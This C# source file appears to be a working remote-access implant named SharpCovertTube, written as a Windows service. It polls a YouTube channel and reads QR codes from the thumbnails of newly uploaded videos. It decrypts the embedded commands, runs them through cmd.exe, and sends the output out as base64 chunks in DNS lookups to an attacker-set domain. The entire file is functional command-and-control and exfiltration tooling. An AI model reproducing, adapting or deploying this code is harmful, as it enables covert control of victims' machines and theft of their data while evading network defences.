using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Diagnostics;
using System.Collections.Generic;
using SharpCovertTube_Service.QRCodeDecoder;
using System.Security.Cryptography;


namespace SharpCovertTube_Service
{
    internal class SharpCovertTube
    {
        /* Configuration values */
        // Channel ID (mandatory!!!). Get it from: https://www.youtube.com/account_advanced
        public const string channel_id = "";
        // API Key (mandatory!!!). Get it from: https://console.cloud.google.com/apis/credentials
        public const string api_key = "";
        // AES Key used for payload encryption
        public const string payload_aes_key = "0000000000000000";
        // IV Key used for payload encryption
        public const string payload_aes_iv = "0000000000000000";
        // Period between every check of the Youtube channel. Default is 10 minutes to avoid exceeding api quota
        public const int seconds_delay = 600;
        // Write debug messages in log file or not
        public const bool log_to_file = true;
        // Log file 
        public const string log_file = "c:\\temp\\.sharpcoverttube.log";
        // Exfiltrate command responses through DNS or not
        public const bool dns_exfiltration = true;
        // DNS hostname used for DNS exfiltration
        public const string dns_hostname = ".test.org";


        static void LogShow(string msg)
        {
            msg = "[" + DateTime.Now.ToString("HH:mm:ss").ToString() + "]  " + msg;
            if (log_to_file)
            {
                using (StreamWriter writer = File.AppendText(log_file))
                {
                    writer.WriteLine(msg);
                }
            }
        }


        static string ByteArrayToStr(byte[] DataArray)
        {
            Decoder decoder = Encoding.UTF8.GetDecoder();
            int CharCount = decoder.GetCharCount(DataArray, 0, DataArray.Length);
            char[] CharArray = new char[CharCount];
            decoder.GetChars(DataArray, 0, DataArray.Length, CharArray, 0);
            return new string(CharArray);
        }


        // Source: https://github.com/Stefangansevles/QR-Capture
        static string DecodeQR(Bitmap QRCodeInputImage)
        {
            QRDecoder decoder = new QRDecoder();
            byte[][] DataByteArray = decoder.ImageDecoder(QRCodeInputImage);
            if (DataByteArray == null)
            {
                Console.WriteLine("DataByteArray is null");
                return "";
            }
            string code = ByteArrayToStr(DataByteArray[0]);
            return code;
        }


        static string ReadQR(string thumbnail_url)
        {
            var client = new WebClient();
            var stream = client.OpenRead(thumbnail_url);
            if (stream == null) return "";
            Bitmap bitmap_from_image = new Bitmap(stream);
            string decoded_cmd = DecodeQR(bitmap_from_image);
            return decoded_cmd;
        }


        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }


        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }


        // Source: MSDN
        static string ExecuteCommand(string command)
        {
            string output = "";
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                StreamReader reader2 = process.StandardOutput;
                output = reader2.ReadToEnd();
                process.WaitForExit();
            }
            return output;
        }


        // Source: https://stackoverflow.com/questions/4133377/splitting-a-string-number-every-nth-character-number
        static IEnumerable<String> SplitInParts(String s, Int32 partLength)
        {
            if (s == null)
            {
                throw new ArgumentNullException(nameof(s));
            }
            if (partLength <= 0)
            {
                throw new ArgumentException("Part length has to be positive.", nameof(partLength));
            }
            for (var i = 0; i < s.Length; i += partLength)
                yield return s.Substring(i, Math.Min(partLength, s.Length - i));
        }


        static void DNSExfil(string response_cmd)
        {
            // Base64-encode the response
            if (response_cmd == "")
            {
                response_cmd = "null";
            }
            string base64_response_cmd = Base64Encode(response_cmd);
            LogShow("Base64-encoded response:\t\t" + base64_response_cmd);
            int max_size = 50; // 255 - dns_hostname.Length - 1; <-- These sizes generate errors and I dont know why
            if (base64_response_cmd.Length > max_size)
            {
                LogShow("Splitting encoded response in chunks of " + max_size + " characters");
            }
            var parts = SplitInParts(base64_response_cmd, max_size);
            foreach (var response_portion in parts)
            {
                // DNS lookup
                try
                {
                    string exfil_hostname = response_portion + dns_hostname;
                    exfil_hostname = exfil_hostname.Replace("=", "");
                    LogShow("DNS lookup against:\t\t\t" + exfil_hostname);
                    Dns.GetHostAddresses(exfil_hostname);
                }
                catch (Exception e)
                {
                    if (e.GetType().ToString() != "System.Net.Sockets.SocketException")
                    {
                        LogShow("[-] Exception: " + e.ToString());
                    }
                }
            }
        }


        static string TryDecrypt(string payload)
        {
            try
            {
                // Base64-decode
                string base64_decoded = Base64Decode(payload);
                string decrypted_cmd = DecryptStringFromBytes(base64_decoded, Encoding.ASCII.GetBytes(payload_aes_key), Encoding.ASCII.GetBytes(payload_aes_iv));
                LogShow("Payload was AES-encrypted");
                return decrypted_cmd;
            }
            catch
            {
                LogShow("Payload was not AES-encrypted");
                return payload;
            }
        }


        static void ReadVideo(string video_id, string channel_url)
        {
            LogShow("Reading new video with ID: \t\t" + video_id);
            string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";

            // Read QR
            string qr_decoded_cmd = ReadQR(thumbnail_url);
            LogShow("Value decoded from QR:\t\t" + qr_decoded_cmd);

            // Decrypt in case it is AES-encrypted
            string decrypted_cmd = TryDecrypt(qr_decoded_cmd);
            LogShow("Value after trying to AES-decrypt:\t" + decrypted_cmd);

            // Execute command
            string response_cmd = ExecuteCommand(decrypted_cmd);
            response_cmd.Trim();
            LogShow("Response from command:\t\t" + response_cmd);

            // Exfiltrate
            if (dns_exfiltration)
            {
                DNSExfil(response_cmd);
            }
        }


        static string getRequest(string url)
        {
            WebRequest wrGETURL = WebRequest.Create(url);
            Stream objStream = wrGETURL.GetResponse().GetResponseStream();
            StreamReader objReader = new StreamReader(objStream);
            string json_response_str = "";
            string sLine = "";
            while (sLine != null)
            {
                json_response_str += sLine;
                sLine = objReader.ReadLine();
            }
            return json_response_str;
        }


        static List<string> GetVideoIds(string channel_url)
        {
            List<string> VideoIds = new List<string>();
            string json_response_str = getRequest(channel_url);

            var deserialized = JSONSerializer<APIInfo>.DeSerialize(json_response_str);
            foreach (Item item in deserialized.items)
            {
                VideoIds.Add(item.id.videoId);
            }

            return VideoIds;
        }


        static void MonitorChannel(string channel_url, int seconds_delay)
        {
            // Initial videos
            List<string> Initial_VideoIds = GetVideoIds(channel_url);
            int number_of_videos = Initial_VideoIds.Count;
            foreach (string value in Initial_VideoIds)
            {
                LogShow("Video already uploaded with ID " + value);
            }

            while (true)
            {
                // Sleep
                LogShow("Sleeping " + seconds_delay + " seconds");
                System.Threading.Thread.Sleep(1000 * seconds_delay);

                // Get list of videos
                List<string> VideoIds = GetVideoIds(channel_url);
                var firstNotSecond = VideoIds.Except(Initial_VideoIds);
                // If new videos -> Read
                if (firstNotSecond != null && firstNotSecond.Any())
                {
                    LogShow("New video(s) uploaded!");

                    foreach (var video_id in firstNotSecond)
                    {
                        ReadVideo(video_id, channel_url);
                    }

                    number_of_videos = VideoIds.Count;
                    Initial_VideoIds = VideoIds;
                }
                // No new videos
                else
                {
                    LogShow("No new videos... Total number of uploaded videos: \t" + VideoIds.Count);
                }
            }
        }


        // AES Decrypt
        static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
        {
            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            string plaintext = null;
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }


        public static void Start()
        {
            if (channel_id == "" || api_key == "")
            {
                LogShow("It is necessary to fill the channel_id and api_key values before running the program.");
                System.Environment.Exit(0);
            }
            LogShow("Monitoring Youtube channel with id " + channel_id);
            string channel_url = "https://www.googleapis.com/youtube/v3/search?" + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
            // LogShow("[+] URL to test for file upload: {0}", channel_url);
            MonitorChannel(channel_url, seconds_delay);
        }
    }
}